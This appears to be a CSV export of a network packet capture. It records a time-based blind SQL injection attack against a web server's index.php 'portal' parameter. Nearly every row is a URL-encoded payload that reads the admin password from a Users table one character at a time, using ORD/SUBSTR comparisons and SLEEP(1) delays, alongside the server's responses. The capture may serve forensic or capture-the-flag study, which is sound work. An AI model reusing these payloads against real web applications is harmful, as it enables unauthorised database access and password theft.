"No.","Time","Source","Destination","Protocol","Length","Info"
"373","6.200638202","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D122%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"375","6.201610180","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"383","6.212670864","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D65%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"385","6.213732012","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"393","6.228062336","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D66%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"395","6.229295079","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"403","6.243161461","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D67%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"405","6.245186058","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"413","6.256436798","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D68%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"415","6.259199689","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"423","6.271279385","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D69%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"425","6.274077221","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"433","6.289939026","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D70%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"435","6.292805914","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"443","6.303749557","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D71%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"445","6.306503233","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"453","6.316779169","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D72%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"455","6.319542345","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"463","6.335499707","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D73%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"465","6.338242130","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"473","6.352813226","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D74%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"475","6.355599617","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"483","6.366426009","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C1%2C1%29%29%3D75%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"487","9.370709932","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"495","9.384384318","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D48%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"497","9.386987254","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"505","9.397664827","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D49%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"507","9.400439279","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"515","9.411460757","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D50%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"517","9.414269117","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"525","9.425180846","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D51%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"527","9.427901215","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"535","9.438866432","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D52%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"537","9.441617456","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"545","9.452738245","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D53%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"547","9.455460023","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"555","9.467361637","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D54%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"557","9.470193317","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"565","9.480735127","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D55%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"567","9.483429482","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"575","9.495963098","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D56%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"577","9.498815456","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"585","9.510600533","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D57%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"587","9.513367483","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"595","9.524450091","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D97%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"597","9.527030024","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"606","9.538918308","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D98%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"609","9.541565420","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"617","9.553193007","150.95.139.51","192.168.1.2","HTTP","428","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D99%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"619","9.555985223","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"627","9.569587110","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D100%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"629","9.572304627","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"637","9.584015794","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D101%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"639","9.586828208","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"647","9.598878844","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D102%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"649","9.601574638","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"654","9.607280251","116.203.86.138","192.168.1.2","HTTP","456","GET / HTTP/1.1 "
"656","9.608170902","192.168.1.2","116.203.86.138","HTTP","462","HTTP/1.1 302 Found "
"661","9.612166998","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D103%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"663","9.614991606","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"671","9.628712231","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C2%2C1%29%29%3D104%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
